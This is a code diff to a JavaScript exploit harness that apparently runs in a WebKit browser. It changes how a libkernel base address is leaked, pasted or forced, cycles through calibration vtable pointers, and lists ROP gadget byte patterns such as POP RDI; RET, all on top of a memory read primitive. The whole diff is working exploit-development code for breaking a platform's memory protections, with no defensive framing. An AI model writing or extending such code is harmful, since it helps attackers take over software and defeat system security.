@@ -42,7 +42,7 @@ import {
 import { createCrashLog } from "./log_persist.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829t";
+const BUILD_ID = "rw-20250829u";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -118,6 +118,7 @@ let scanPivotAuto = false;
 let scanPivotStop = false;
 let scanQuiet = false;
 let scanRenderPending = 0;
+let lkQuiet = false;
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
 const _scanBytes = new Array(8);
 const _win16 = new Array(16);
@@ -136,6 +137,13 @@ function clearPersistedLog() {
 
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
+    if (lkQuiet) {
+        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE)/.test(tag)) {
+            lines.push(line);
+            if (lines.length > 40) lines.splice(0, lines.length - 40);
+        }
+        return;
+    }
     const raceCritical = /FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag);
     if (raceMode) {
         raceBuf.push(line);
@@ -283,13 +291,6 @@ const CAL_VTABLE_PTRS = [
 ];
 const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
 let calPtrIdx = 0;
-let calWalk = null;
-const CAL_WALK_MAX = 12;
-
-function pageAlignPtr(addr) {
-    if (!addr) return null;
-    return new int64((addr.low >>> 0) & ~0x3fff, addr.hi >>> 0);
-}
 
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -324,9 +325,10 @@ const MANUAL_TESTS = [
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
-    { id: "try-cal-ptrs", group: "base", label: "Try cal ptr" },
+    { id: "try-cal-ptrs", group: "base", label: "Load cal ptr" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
-    { id: "paste-lk", group: "base", label: "Paste libkernel" },
+    { id: "force-lk", group: "base", label: "Force lk" },
+    { id: "paste-lk", group: "base", label: "Paste lk (1 peek)" },
     { id: "libkernel", group: "base", label: "libkernel" },
     { id: "stub20", group: "base", label: "getpid stub" },
     { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
@@ -403,22 +405,41 @@ function runManualTest(testId) {
             const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
             const lk = parseAddr(raw.replace(/^0x/i, ""));
             if (!lk) {
-                mark("LK-SKIP", "enter libkernel base in hex box above, then tap Paste libkernel");
+                mark("LK-SKIP", "enter libkernel base in hex box, then Paste (1 peek) or Force lk (0 reads)");
                 return;
             }
-            const v = verifyManualLibkernelFromPtr(p, raw.replace(/^0x/i, ""), off);
-            if (v.ok) {
-                mark("LK-OK", "pasted → " + v.lk + " (" + (v.via || "?") + ")");
-                state("libkernel pasted OK", "ok");
+            lkQuiet = true;
+            let w = null;
+            try {
+                w = read4p(p, lk);
+            } catch (_) { }
+            lkQuiet = false;
+            if (w != null) {
+                saveLibkernelSession(lk, null);
+                mark("LK-OK", "peek " + fmtHex32(w) + " @ " + lk + " — saved unverified");
+                state("libkernel saved (1 peek)", "ok");
             } else {
-                const also = verifyManualLibkernel(p, lk);
-                if (also.ok) {
-                    mark("LK-OK", "pasted base " + lk);
-                    state("libkernel pasted OK", "ok");
-                } else {
-                    mark("GADGET-BAD", v.error || also.error || "bad libkernel");
-                }
+                mark("LK-FAIL", "read failed @ " + lk + " — use Force lk if base from cal");
+                state("peek failed — Force lk?", "bad");
             }
+            renderOut();
+            crashLog.append("LK-OK pasted " + lk, "LK-OK");
+            crashLog.flushSync();
+            return;
+        }
+        if (testId === "force-lk") {
+            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
+            const lk = parseAddr(raw.replace(/^0x/i, ""));
+            if (!lk) {
+                mark("LK-SKIP", "enter libkernel base hex, then Force lk (0 reads)");
+                return;
+            }
+            saveLibkernelSession(lk, null);
+            mark("LK-OK", "forced " + lk + " (0 reads — unverified)");
+            state("libkernel forced", "warn");
+            renderOut();
+            crashLog.append("LK-OK forced " + lk, "LK-OK");
+            crashLog.flushSync();
             return;
         }
         if (testId === "scan-iat") {
@@ -1722,10 +1743,8 @@ async function runShowLkHints() {
 let leakScanState = null;
 
 function runTryCalPtrs() {
-    if (!ready || !window.p || busy) return;
-    const p = window.p;
-    const off = loadEffectiveOff();
-    const { webkitBase } = basesFromSession(off);
+    if (!ready || busy) return;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
     if (!webkitBase) {
         mark("LK-SKIP", "no webkitBase — Save bases first");
         return;
@@ -1733,49 +1752,27 @@ function runTryCalPtrs() {
     const cands = CAL_VTABLE_PTRS;
     if (calPtrIdx >= cands.length) {
         calPtrIdx = 0;
-        calWalk = null;
         mark("LK-CAL-DONE", "cycle reset — tried all " + cands.length);
         renderOut();
         return;
     }
-    const c = cands[calPtrIdx];
-    if (lines.length > 48) lines.splice(0, lines.length - 48);
-    if (!calWalk || calWalk.idx !== calPtrIdx) {
-        const fn = parseCalPtr(c.ptr);
-        calWalk = { idx: calPtrIdx, label: c.label, page: pageAlignPtr(fn), step: 0 };
+    const c = cands[calPtrIdx++];
+    if (lines.length > 32) lines.splice(0, lines.length - 32);
+    if (addrIn) addrIn.value = c.ptr;
+    lkQuiet = true;
+    mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + cands.length
+        + " " + c.label + " " + c.ptr + " expect " + c.code);
+    mark("LK-HINT", "0 reads — edit hex to lk base from cal, tap Force lk");
+    lkQuiet = false;
+    if (outEl) {
+        outEl.textContent = lines.join("\n");
+        outEl.scrollTop = outEl.scrollHeight;
     }
-    mark("LK-CAL", "build=" + BUILD_ID + " " + c.label + " walk " + calWalk.step
-        + "/" + CAL_WALK_MAX + " @ " + calWalk.page);
-    renderOut();
-    busy = true;
-    setUi();
+    state("loaded " + c.label + " → Force lk", "warn");
     try {
-        if (checkPrologueAt(p, calWalk.page)) {
-            saveLibkernelSession(calWalk.page, null);
-            mark("LK-OK", c.label + " " + c.ptr + " → " + calWalk.page + " (walk-" + calWalk.step + ")");
-            state("libkernel OK", "ok");
-            calPtrIdx++;
-            calWalk = null;
-        } else {
-            calWalk.step++;
-            if (calWalk.step >= CAL_WALK_MAX) {
-                mark("LK-CAL-MISS", c.label + " walk exhausted");
-                calPtrIdx++;
-                calWalk = null;
-                state("next ptr (" + (calPtrIdx + 1) + "/" + cands.length + ")", "warn");
-            } else {
-                calWalk.page = calWalk.page.sub32(0x4000);
-                mark("LK-CAL", "miss — tap again (same ptr, page-" + calWalk.step + ")");
-                state("tap Try cal ptr (walk " + calWalk.step + ")", "warn");
-            }
-        }
-    } catch (err) {
-        mark("LK-FAIL", String(err.message || err));
-        state("cal ptr error", "bad");
-    }
-    busy = false;
-    setUi();
-    renderOut();
+        crashLog.append("LK-CAL loaded " + c.label + " " + c.ptr, "LK-CAL");
+        crashLog.flushSync();
+    } catch (_) { }
 }
 
 async function runLeakLkScan() {
